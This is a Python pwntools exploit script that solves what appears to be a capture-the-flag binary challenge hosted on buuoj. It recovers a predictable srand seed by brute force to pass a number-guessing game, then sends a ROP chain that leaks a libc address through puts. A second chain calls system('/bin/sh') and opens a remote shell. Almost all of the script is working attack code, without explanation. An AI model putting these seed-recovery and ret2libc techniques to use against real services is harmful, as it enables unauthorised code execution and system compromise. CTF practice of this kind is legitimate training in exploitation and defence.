#!/usr/bin/env python3
#coding:utf-8

from ctypes import *
from pwn import *


#--------------------prepare------------------------
binary = './pwn_fixed'
libc_so = ""
host = "node4.buuoj.cn"
port = 10001

#---------------------------------------------------

elf = ELF(binary)
libc = ELF(libc_so) if libc_so else elf.libc
context(arch = elf.arch, os = 'linux')
if args.G:
    context.log_level = 'debug'
p = remote(host, port) if args.R else process(binary)

def attach(msg = ''):
    if args.R:
        return
    context(log_level = 'debug', terminal=["tmux","splitw","-v"])
    gdb.attach(p, gdbscript=msg)
    dbg('go to gdb')

#---------------------short command-------------------
dbg = lambda msg='debug': info(f'[*]{msg}') if args.R else input(f"pid: {pidof(p)[0]} =>{msg}")
checkstr = lambda data:data if isinstance(data, bytes) else data.encode()
sl = lambda data: p.sendline(checkstr(data))
sd = lambda data: p.send(checkstr(data))
sa = lambda delimit, data: p.sendafter(checkstr(delimit), checkstr(data))
sla = lambda delimit, data: p.sendlineafter(checkstr(delimit), checkstr(data))
ru = lambda delimit, *args, **kwargs: p.recvuntil(checkstr(delimit), *args, **kwargs)
rl = lambda : p.recvline()
rcn = lambda number=4096,*args, **kwargs: p.recv(number,*args, **kwargs)
ss = lambda delimit, data: success(f'{delimit}: {data:#x}')
uu64 = lambda data:u64(checkstr(data).ljust(8, p8(0)))
uu32 = lambda data:u32(checkstr(data).ljust(4, p8(0)))
str_bin_sh = next(libc.search(b'/bin/sh\x00'))
get_flag = lambda : sl(f"cat {'flag' if args.R else '/tmp/flag'}")

#---------------------PWN SPACE----------------------
dll = cdll.LoadLibrary("/libs/2.23-0ubuntu3_amd64/libc-2.23.so")
def getseed(start, end, one_rand):
    
    seed = 0
    #0x7ffebad66b04
    for i in range(start,end,1):
        s = i<<4
        s = s+4
        dll.srand(s)
        rand1 = dll.rand()
        rand2 = dll.rand()
        if rand2 == one_rand:
            seed = s
            print(f'rand1: {rand1} rand2: {rand2} seed: {seed}')
            break
    if not seed:
        print('no seed found')
        exit()
    return seed


#--------------------part 1---------------------------
sla("Let's play a gamble game.\n", str(1))

ru('number is: ')
rand2 = int(rl()[:-1])

print('rand2 :', rand2)
seed = getseed(10000000, 0xfffffff, rand2)
dll.srand(seed)

rand1 = dll.rand()
rand2 = dll.rand()

print(f'rand1: {rand1} rand2: {rand2} seed: {seed}')

for i in range(10):
    sl(str(dll.rand()))
    sleep(0.1)

ru('Bingo. leave ur name to us. plz')

#gadget
leave_ret = 0x400a26 #leave; ret;
p_rdi_ret = 0x400a93 #pop rdi; ret;
p_rsi_ret = 0x400a91 #pop rsi; pop r15; ret; 
puts_plt = elf.plt.puts
puts_got = elf.got.puts
read_plt = elf.plt.read
bss_addr = 0x600F10
fake_stack = bss_addr + 0x50


payload = flat({
    0x4: p32(rand1),
    0x24:[
        fake_stack-8,  #rbp
        p_rdi_ret,
        puts_got,
        puts_plt, #read
        0x400867 #main
    ]
})

sd(payload)

#-----------------------part 2--------------------
puts_addr = uu64(ru(p8(0x7f))[-6:])
libc_base = puts_addr - libc.sym.puts
system_addr = libc_base+libc.sym.system
str_bin_sh = libc_base + str_bin_sh
ss('libc', libc_base)
ss('system_addr', system_addr)
#dbg()

sla("Let's play a gamble game.\n", str(1))

ru('number is: ')
rand2 = int(rl()[:-1])

print('rand2 :', rand2)
seed1 = getseed(10000000, 0xfffffff, rand2)
dll.srand(seed1)
rand1 = dll.rand()
rand2 = dll.rand()


for i in range(10):
    sl(str(dll.rand()))
    sleep(0.1)

ru('Bingo. leave ur name to us. plz')

payload = flat({
    0x4: p32(rand1),
    0x24:[
        fake_stack-8,  #rbp
        p_rdi_ret,
        str_bin_sh,
        system_addr, #read
        0x400867
    ]
})
sd(payload)

#--------INTERACTIVE----------------------------
#get_flag()
p.interactive()

# while True:
#     p = remote(host, port) if args.R else process(binary)
#     try:
#         pwn()
#     except Exception as e:
#         p.close()
